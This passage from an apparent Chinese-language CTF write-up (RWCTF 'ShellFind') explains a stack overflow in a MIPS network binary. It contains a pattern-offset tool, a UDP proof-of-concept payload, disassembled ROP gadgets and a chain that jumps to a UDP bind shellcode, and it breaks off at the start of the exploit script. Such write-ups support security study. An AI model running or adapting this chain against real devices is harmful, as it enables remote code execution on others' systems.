class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">生成定位字符串：轮子直接使用</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">a =<span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span></span><br><span class="line">b =<span class="string">"abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line">c = <span class="string">"0123456789"</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate</span>(<span class="params">count,output</span>):</span><br><span class="line">    <span class="comment"># pattern create</span></span><br><span class="line">    codeStr =<span class="string">''</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">'[*] Create pattern string contains %d characters'</span>%count</span><br><span class="line">    timeStart = time.time()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,count):</span><br><span class="line">        codeStr += a[i/(<span class="number">26</span>*<span class="number">10</span>)] + b[(i%(<span class="number">26</span>*<span class="number">10</span>))/<span class="number">10</span>] + c[i%(<span class="number">26</span>*<span class="number">10</span>)%<span class="number">10</span>]</span><br><span class="line">    <span class="built_in">print</span> <span class="string">'ok!'</span></span><br><span class="line">    <span class="keyword">if</span> output:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">'[+] output to %s'</span>%output</span><br><span class="line">        fw = <span class="built_in">open</span>(output,<span class="string">'w'</span>)</span><br><span class="line">        fw.write(codeStr)</span><br><span class="line">        fw.close()</span><br><span class="line">        <span class="built_in">print</span> <span class="string">'ok!'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> codeStr</span><br><span class="line">    <span class="built_in">print</span> <span class="string">"[+] take time: %.4f s"</span>%(time.time()-timeStart)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">patternMatch</span>(<span class="params">searchCode, length=<span class="number">1024</span></span>):</span><br><span class="line"> </span><br><span class="line">   <span class="comment"># pattern search</span></span><br><span class="line">   offset = <span class="number">0</span></span><br><span class="line">   pattern = <span class="literal">None</span></span><br><span class="line"> </span><br><span class="line">   timeStart = time.time()</span><br><span class="line">   is0xHex = re.match(<span class="string">'^0x[0-9a-fA-F]{8}'</span>,searchCode)</span><br><span class="line">   isHex = re.match(<span class="string">'^[0-9a-fA-F]{8}'</span>,searchCode)</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">if</span> is0xHex:</span><br><span class="line">       <span class="comment">#0x41613141</span></span><br><span class="line">       pattern = binascii.a2b_hex(searchCode[<span class="number">2</span>:])</span><br><span class="line">   <span class="keyword">elif</span> isHex:</span><br><span class="line">       pattern = binascii.a2b_hex(searchCode)</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       <span class="built_in">print</span>  <span class="string">'[-] seach Pattern eg:0x41613141'</span></span><br><span class="line">       sys.exit(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">   source = generate(length,<span class="literal">None</span>)</span><br><span class="line">   offset = source.find(pattern)</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">if</span> offset != -<span class="number">1</span>: <span class="comment"># MBS</span></span><br><span class="line">       <span class="built_in">print</span> <span class="string">"[*] Exact match at offset %d"</span> % offset</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       <span class="built_in">print</span></span><br><span class="line">       <span class="string">"[*] No exact matches, looking for likely candidates..."</span></span><br><span class="line">       reverse = <span class="built_in">list</span>(pattern)</span><br><span class="line">       reverse.reverse()</span><br><span class="line">       pattern = <span class="string">""</span>.join(reverse)</span><br><span class="line">       offset = source.find(pattern)</span><br><span class="line"> </span><br><span class="line">       <span class="keyword">if</span> offset != -<span class="number">1</span>:</span><br><span class="line">           <span class="built_in">print</span> <span class="string">"[+] Possible match at offset %d (adjusted another-endian)"</span> % offset</span><br><span class="line"> </span><br><span class="line">   <span class="built_in">print</span> <span class="string">"[+] take time: %.4f s"</span> % (time.time() - timeStart)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mian</span>():</span><br><span class="line">   <span class="string">'''</span></span><br><span class="line"><span class="string">   parse argument</span></span><br><span class="line"><span class="string">   '''</span></span><br><span class="line">   parser = argparse.ArgumentParser()</span><br><span class="line">   parser.add_argument(<span class="string">'-s'</span>, <span class="string">'--search'</span>, <span class="built_in">help</span>=<span class="string">'search for pattern'</span>)</span><br><span class="line">   parser.add_argument(<span class="string">'-c'</span>, <span class="string">'--create'</span>, <span class="built_in">help</span>=<span class="string">'create a pattern'</span>,action=<span class="string">'store_true'</span>)</span><br><span class="line">   parser.add_argument(<span class="string">'-f'</span>,<span class="string">'--file'</span>,<span class="built_in">help</span>=<span class="string">'output file name'</span>,default=<span class="string">'patternShell.txt'</span>)</span><br><span class="line">   parser.add_argument(<span class="string">'-l'</span>, <span class="string">'--length'</span>, <span class="built_in">help</span>=<span class="string">'length of pattern code'</span>,<span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">1024</span>)</span><br><span class="line">   args = parser.parse_args()</span><br><span class="line">   <span class="string">'''</span></span><br><span class="line"><span class="string">   save all argument</span></span><br><span class="line"><span class="string">   '''</span></span><br><span class="line">   length= args.length</span><br><span class="line">   output = args.file</span><br><span class="line">   createCode = args.create</span><br><span class="line">   searchCode = args.search</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">if</span> createCode <span class="keyword">and</span> (<span class="number">0</span> &lt;args.length &lt;= <span class="number">26</span>*<span class="number">26</span>*<span class="number">10</span>):</span><br><span class="line">       generate(length,output)</span><br><span class="line">   <span class="keyword">elif</span> searchCode <span class="keyword">and</span> (<span class="number">0</span> &lt;args.length &lt;=<span class="number">26</span>*<span class="number">26</span>*<span class="number">10</span>):</span><br><span class="line">       patternMatch(searchCode,length)</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       <span class="built_in">print</span> <span class="string">'[-] You shoud chices from [-c -s]'</span></span><br><span class="line">       <span class="built_in">print</span> <span class="string">'[-] Pattern length must be less than 6760'</span></span><br><span class="line">       <span class="built_in">print</span> <span class="string">'more help: pattern.py -h'</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">   <span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">       mian()</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 pattern.py -c -l 800 -f content</span><br></pre></td></tr></tbody></table></figure>

<p>生成了800个垃圾数据，如下poc进行偏移确定</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">p2 = <span class="string">b'FIVI'</span></span><br><span class="line">p2 += <span class="string">b'\x00\x00\x00\x00'</span></span><br><span class="line">p2 += <span class="string">b'\n'</span></span><br><span class="line">p2 += <span class="string">b'\x02\x00'</span></span><br><span class="line">p2 += <span class="string">b'\x00\x00\x00\x00\x00\x00'</span></span><br><span class="line">p2 += mac_addr</span><br><span class="line">p2 += <span class="string">b'\x00\x00'</span></span><br><span class="line">p2 += <span class="string">b'\x8E'</span></span><br><span class="line">p2 = p2.ljust(<span class="number">0x5d</span>, <span class="string">b'\x00'</span>)</span><br><span class="line"></span><br><span class="line">p3 = <span class="string">b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9'</span></span><br><span class="line"></span><br><span class="line">p2 += base64.b64encode(p3)</span><br><span class="line">li(p2)</span><br><span class="line"></span><br><span class="line">r.sendto(p2, (ip, port))</span><br></pre></td></tr></tbody></table></figure>

<p>ida调试中最后发现$ra被覆盖成了<code>41743641</code></p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python2 pattern.py -s 0x41743641 -f content</span><br><span class="line">[*] Create pattern string contains 1024 characters</span><br><span class="line">ok!</span><br><span class="line">[*] Exact match at offset 588</span><br><span class="line">[+] take time: 0.0004 s</span><br></pre></td></tr></tbody></table></figure>

<p>最后得到偏移为588，现在可以控制ra了，接下来需要寻找gadgets来getshell</p>
<p>程序保护都没开，所以有很多选择，这里采取的是ret2shellcode，把shellcode放到栈上，然后跳转执行即可，但是需要一个栈地址</p>
<p>在跳转之前需要注意一个gp寄存器，gp寄存器它的值被用来定位静态数据区域，所以要保证gp寄存器不会出错</p>
<p>这个值是这样算的，在ropgadget筛选的时候可以看到strcmp这里-0x7f9c，所以对应这里<code>strcmp + 0x7f9c = 0x0041B030</code></p>
<p>下面这个gadgets执行完毕之后会调用close清空a0, a1, a2，为得是不影响后一个gadgets的使用，并且可以控制gp和ra</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:004020A4 8F BC 00 18                   lw      $gp, 0x7C+var_64($sp)</span><br><span class="line">.text:004020A8 8F 99 80 38                   la      $t9, close</span><br><span class="line">.text:004020AC 03 20 F8 09                   jalr    $t9 ; close</span><br><span class="line">.text:004020B0 02 00 20 21                   move    $a0, $s0                         # fd</span><br><span class="line">.text:004020B0</span><br><span class="line">.text:004020B4</span><br><span class="line">.text:004020B4                               loc_4020B4:                              # CODE XREF: sub_401DF4+1AC↑j</span><br><span class="line">.text:004020B4                                                                        # sub_401DF4+238↑j</span><br><span class="line">.text:004020B4                                                                        # sub_401DF4+284↑j</span><br><span class="line">.text:004020B4 8F BF 00 84                   lw      $ra, 0x7C+var_s8($sp)</span><br><span class="line">.text:004020B8 8F B1 00 80                   lw      $s1, 0x7C+var_s4($sp)</span><br><span class="line">.text:004020BC 8F B0 00 7C                   lw      $s0, 0x7C+var_s0($sp)</span><br><span class="line">.text:004020C0 03 E0 00 08                   jr      $ra</span><br><span class="line">.text:004020C4 27 BD 00 88                   addiu   $sp, 0x88</span><br></pre></td></tr></tbody></table></figure>

<p>接着控制ra为下一个gadgets的地址</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.text:00401F98 0C 10 04 F4                   jal     my_puts</span><br><span class="line">.text:00401F9C 24 84 2C F8                   li      $a0, aCanTGetHelloSo             # "Can't get hello socket\n"</span><br><span class="line">.text:00401F9C</span><br><span class="line">.text:00401FA0 10 00 00 44                   b       loc_4020B4</span><br><span class="line">.text:00401FA4 00 00 00 00                   nop</span><br><span class="line"></span><br><span class="line">my_puts</span><br><span class="line">.text:004013D0 addiu   $sp, -0x10</span><br><span class="line">.text:004013D4 sw      $a1, 0x10+arg_4($sp)</span><br><span class="line">.text:004013D8 sw      $a2, 0x10+arg_8($sp)</span><br><span class="line">.text:004013DC sw      $a3, 0x10+arg_C($sp)</span><br><span class="line">.text:004013E0 addiu   $v0, $sp, 0x10+arg_4</span><br><span class="line">.text:004013E4 sw      $v0, 0x10+var_8($sp)</span><br><span class="line">.text:004013E8 addiu   $sp, 0x10</span><br><span class="line">.text:004013EC jr      $ra</span><br><span class="line">.text:004013F0 nop</span><br><span class="line"></span><br><span class="line">loc_4020B4</span><br><span class="line">.text:004020B4 8F BF 00 84                   lw      $ra, 0x7C+var_s8($sp)</span><br><span class="line">.text:004020B8 8F B1 00 80                   lw      $s1, 0x7C+var_s4($sp)</span><br><span class="line">.text:004020BC 8F B0 00 7C                   lw      $s0, 0x7C+var_s0($sp)</span><br><span class="line">.text:004020C0 03 E0 00 08                   jr      $ra</span><br><span class="line">.text:004020C4 27 BD 00 88                   addiu   $sp, 0x88</span><br></pre></td></tr></tbody></table></figure>

<p>上面这个gadgets详细说一下，首先是进入my_puts这里</p>
<p>这里<code>addiu   $v0, $sp, 0x10+arg_4</code>把栈上的地址给存到了v0中，然后又把v0的值放到了sp + 0x8这里</p>
<p>在4020b4中可以控制s0，这里把s0控制成<code>0x00413200 - 0xd</code>，这是因为下面的gadgets需要用到</p>
<p>然后又到了<code>loc_4020B4</code>这里，这里可以控制$ra，那么就可以继续ROP下去，接着到<code>0x00400C9C</code>这里的gadgets</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00400c9c : lw $gp, 0x10($sp) ; lw $ra, 0x1c($sp) ; jr $ra ; addiu $sp, $sp, 0x20</span><br></pre></td></tr></tbody></table></figure>

<p>恢复GP，然后控制ra到<code>0x00400F28</code></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:00400F28 AE 02 00 0D                   sw      $v0, 0xD($s0)</span><br><span class="line">.text:00400F28</span><br><span class="line">.text:00400F2C</span><br><span class="line">.text:00400F2C                               loc_400F2C:                              # CODE XREF: sub_400E50+CC↑j</span><br><span class="line">.text:00400F2C 8F 82 80 68                   la      $v0, ifname</span><br><span class="line">.text:00400F30 8C 44 00 00                   lw      $a0, (ifname - 0x413138)($v0)</span><br><span class="line">.text:00400F34 8F 99 80 8C                   la      $t9, net_get_hwaddr</span><br><span class="line">.text:00400F38 03 20 F8 09                   jalr    $t9 ; net_get_hwaddr</span><br><span class="line">.text:00400F3C 26 05 00 11                   addiu   $a1, $s0, 0x11</span><br><span class="line">.text:00400F3C</span><br><span class="line">.text:00400F40 8F BF 00 24                   lw      $ra, 0x20+var_s4($sp)</span><br><span class="line">.text:00400F44 8F B0 00 20                   lw      $s0, 0x20+var_s0($sp)</span><br><span class="line">.text:00400F48 03 E0 00 08                   jr      $ra</span><br><span class="line">.text:00400F4C 27 BD 00 28                   addiu   $sp, 0x28</span><br></pre></td></tr></tbody></table></figure>

<p>然后这里就需要用到上面的把s0控制成<code>0x00413200 - 0xd</code>，在<code>sw      $v0, 0xD($s0)</code>这里是把v0的值放到s0 + 0xd这个位置，这个位置是<code>0x413200</code>是net_get_dns，这样的话net_get_dns这里就是v0，就是栈上的地址了，如果调用net_get_dns的时候就会调用栈上的地址</p>
<p>在gadgets的最后可以控制s0和ra，控制s0为net_get_dns的值也就是栈上的地址，控制ra为<code>0x004027C8</code></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:004027C8 lw      $t9, 0($s0)</span><br><span class="line">.text:004027CC bne     $t9, $s1, loc_4027C0</span><br><span class="line">.text:004027D0 addiu   $s0, -4</span><br><span class="line">.text:004027D0</span><br><span class="line">.text:004027D4 lw      $ra, 0x1C+var_s8($sp)</span><br><span class="line">.text:004027D8 lw      $s1, 0x1C+var_s4($sp)</span><br><span class="line">.text:004027DC lw      $s0, 0x1C+var_s0($sp)</span><br><span class="line">.text:004027E0 jr      $ra</span><br><span class="line">.text:004027E4 addiu   $sp, 0x28</span><br></pre></td></tr></tbody></table></figure>

<p>把栈上的地址放到t9中，会跳到loc_4027C0中执行<code>jalr $t9</code>，执行栈地址上的东西</p>
<p>shellcode可以采用udp_bind_shell</p>
<p>但是在调试的时候会发现跳不到shellcode上，所以在上面的一个地方加上一个跳转指令</p>
<p><img src="/2023/04/10/RWCTF-5th-ShellFind%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/2.png" alt="2"></p>
<p>至此，上面就是完整的漏洞利用</p>
<p>exp如下</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'mips'</span>, endian=<span class="string">'big'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">lg = <span class="keyword">lambda</span> x : <span 